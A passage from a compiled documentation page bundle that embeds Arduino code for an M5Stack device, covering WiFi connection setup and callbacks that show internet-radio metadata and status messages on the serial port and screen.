Serial.flush();\n}\n\nvoid initwifi() {\n  WiFi.disconnect();\n  WiFi.softAPdisconnect(true);\n  WiFi.mode(WIFI_STA);\n  WiFi.begin(SSID, PASSWORD);\n\n  // Try forever\n  int i = 0;\n  while (WiFi.status() != WL_CONNECTED) {\n    Serial.print("STATUS(Connecting to WiFi) ");\n    delay(1000);\n    i = i + 1;\n    if (i > 10) {\n      ESP.restart();\n    }\n  }\n  Serial.println("OK");\n}\n\n// Called when a metadata event occurs (i.e. an ID3 tag, an ICY block, etc.\nvoid MDCallback(void *cbData, const char *type, bool isUnicode, const char *string) {\n  const char *ptr = reinterpret_cast<const char *>(cbData);\n  (void) isUnicode; // Punt this ball for now\n  // Note that the type and string may be in PROGMEM, so copy them to RAM for printf\n  char s1[32], s2[64];\n  strncpy_P(s1, type, sizeof(s1));\n  s1[sizeof(s1) - 1] = 0;\n  strncpy_P(s2, string, sizeof(s2));\n  s2[sizeof(s2) - 1] = 0;\n  Serial.printf("METADATA(%s) \'%s\' = \'%s\'\\n", ptr, s1, s2);\n  M5.Lcd.setTextSize(1);\n  M5.Lcd.setCursor(0, 45, 2);\n  M5.Lcd.print(s2);\n  M5.Lcd.print("                                                                                          ");\n  Serial.flush();\n}\n\n// Called when there\'s a warning or error (like a buffer underflow or decode hiccup)\nvoid StatusCallback(void *cbData, int code, const char *string) {\n  const char *ptr = reinterpret_cast<const char *>(cbData);\n  // Note that the string may be in PROGMEM, so copy it to RAM for printf\n  char s1[64];\n  strncpy_P(s1, string, sizeof(s1));\n  s1[sizeof(s1) - 1] = 0;\n  Serial.printf("STATUS(%s) \'%d\' = \'%s\'\\n", ptr, code, s1);\n  Serial.flush();\n}\n\n')])])]),i("h2",{attrs:{id:"m5stick-v"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#m5stick-v"}},[n._v("#")]),n._v(" M5Stick-V")]),n._v(" "),i("h2",{attrs:{id:"m5stack"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#m5stack"}},[n._v("#")]),n._v(" M5Stack")])])}),[],!1,null,null,null);e.default=r.exports}}]);